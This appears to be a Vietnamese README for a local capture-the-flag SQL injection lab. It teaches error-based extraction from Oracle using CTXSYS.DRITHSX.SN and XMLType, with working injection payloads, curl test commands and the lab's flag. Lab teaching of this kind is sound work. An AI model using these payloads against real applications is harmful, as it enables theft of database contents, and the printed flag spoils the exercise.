# SQLi-015: Oracle CTXSYS.DRITHSX.SN Error-based

## 🎯 Mục Tiêu

Khai thác SQL Injection trên Oracle Database bằng kỹ thuật **Error-based** với hàm `CTXSYS.DRITHSX.SN`.

## 📝 Mô Tả

Ứng dụng Report Generator cho phép xem các báo cáo thông qua tham số `id`:

**URL:** `http://localhost:5015/report?id=1`

Ứng dụng sử dụng Oracle Database làm backend và có lỗ hổng SQL Injection. Database chứa 2 bảng:

- `reports`: Chứa các báo cáo công khai (id, title, content)
- `secrets`: Chứa dữ liệu nhạy cảm (id, name, value) - **Đây là mục tiêu**

## 🎓 Kiến Thức Cần Biết

### CTXSYS.DRITHSX.SN là gì?

`CTXSYS.DRITHSX.SN` là một hàm nội bộ của **Oracle Text** (Oracle's full-text search engine), được thiết kế để tạo sequence numbers cho text indexing. Hàm này có 2 tham số:

```sql
CTXSYS.DRITHSX.SN(index_id, text_value)
```

**Đặc điểm quan trọng:**

- Tham số thứ 2 (`text_value`) được sử dụng để tìm kiếm thesaurus
- Khi truyền vào một tên thesaurus không tồn tại
- Oracle sẽ báo lỗi: **"thesaurus [value] does not exist"**
- **Data bị leak qua error message** → Đây là điểm khai thác!

**Error message mẫu:**

```
ORA-20000: Oracle Text error:
DRG-11701: thesaurus APP_USER does not exist
```

### Tại sao dùng CTXSYS.DRITHSX.SN?

Trong các kỹ thuật Error-based SQLi trên Oracle, có nhiều hàm có thể khai thác:

| Hàm                        | Ưu điểm                                   | Nhược điểm                                     |
| -------------------------- | ----------------------------------------- | ---------------------------------------------- |
| `CTXSYS.DRITHSX.SN`        | ✅ Trả về đầy đủ dữ liệu<br>✅ Dễ sử dụng | ⚠️ Yêu cầu Oracle Text                         |
| `XMLType`                  | ✅ Có sẵn mọi version                     | ❌ Cú pháp phức tạp hơn                        |
| `UTL_INADDR.GET_HOST_NAME` | ✅ Có sẵn mặc định                        | ❌ Yêu cầu quyền cao<br>❌ Có thể bị firewall  |
| `DBMS_XDB_VERSION.CHECKIN` | ✅ Trả về full data                       | ❌ Không có trên mọi version<br>❌ Yêu cầu XDB |

**Kết luận:** `CTXSYS.DRITHSX.SN` là lựa chọn tốt nhất vì:

- Output rõ ràng nhất (data nằm ngay trong error message)
- Không yêu cầu quyền đặc biệt
- Cú pháp đơn giản, dễ nhớ

**Lưu ý:** Lab này sử dụng **Oracle Free** (có Oracle Text built-in).

### Cú pháp cơ bản

```sql
-- Lấy database user hiện tại
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--

-- Lấy database version
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--

-- Lấy dữ liệu từ bảng bất kỳ
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT column_name FROM table_name WHERE ROWNUM=1))--

-- Concatenate nhiều rows với LISTAGG
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--
```

### LISTAGG - Kỹ thuật quan trọng

Khi subquery trả về nhiều rows, sử dụng `LISTAGG` để concatenate:

```sql
LISTAGG(column_name, delimiter) WITHIN GROUP (ORDER BY sort_column)
```

**Ví dụ:**

```sql
-- ❌ Lỗi: ORA-01427 (multiple rows)
SELECT table_name FROM user_tables

-- ✅ Đúng: Concat thành 1 string
SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables
-- Output: "REPORTS,SECRETS"
```

```sql
-- Lấy database user hiện tại
' AND 1=XMLType((SELECT user FROM dual))--

-- Lấy dữ liệu từ bảng secrets (Final payload)
1 AND 1=XMLType((SELECT value FROM secrets WHERE ROWNUM=1))--
```

**XMLType Error Output:**

```
ORA-19202: Error occurred in XML processing
LPX-00210: expected '<' instead of 'F'
Error at line 1
FLAG{ctxsys_dr1thsx_0r4cl3}
```

**So sánh:**
| Method | Availability | Output Quality | Ease of Use |
|--------|--------------|----------------|-------------|
| CTXSYS.DRITHSX.SN | ⚠️ Cần Oracle Text | ⭐⭐⭐⭐⭐ Full output | ⭐⭐⭐⭐⭐ Rất dễ |
| XMLType | ✅ Luôn có | ⭐⭐⭐⭐ Good output | ⭐⭐⭐⭐ Dễ |

## 🚀 Hướng Dẫn Triển Khai

### Khởi động lab

```bash
# Khởi động containers
docker-compose up -d

# Monitor database initialization (đợi 3-5 phút)
docker logs sqli-015-db-1 -f
# Wait for "DATABASE IS READY TO USE!"

# Kiểm tra web app
curl "http://localhost:5015/report?id=1"
```

### Test application

```bash
# Test basic SQLi detection
curl "http://localhost:5015/report?id=1'"
# Expect: ORA-01756 error

# Test CTXSYS method
curl "http://localhost:5015/report?id=1+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+user+FROM+dual))--"
# Expect: thesaurus APP_USER does not exist
```

### Dừng lab

```bash
docker-compose down
```

## 💡 Gợi Ý

1. **Bước 1:** Kiểm tra ứng dụng có lỗ hổng SQLi không bằng cách test payload `id=1'`
2. **Bước 2:** Xác định database là Oracle từ error code `ORA-xxxxx`
3. **Bước 3:** Test CTXSYS.DRITHSX.SN có available không
4. **Bước 4:** Enumerate database user, tables, columns
5. **Bước 5:** Sử dụng LISTAGG để xem nhiều rows cùng lúc
6. **Bước 6:** Extract flag từ bảng SECRETS

## 📚 Tài Liệu Tham Khảo

- [Complete Writeup](solution/writeup.md) - Chi tiết từng bước khai thác
- [Exploit Script](solution/exploit.py) - Automated exploitation
- [Troubleshooting Guide](TROUBLESHOOTING.md) - Xử lý lỗi thường gặp
- [Oracle SQLi Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)

## 🏁 Flag Format

`FLAG{ctxsys_dr1thsx_0r4cl3}`
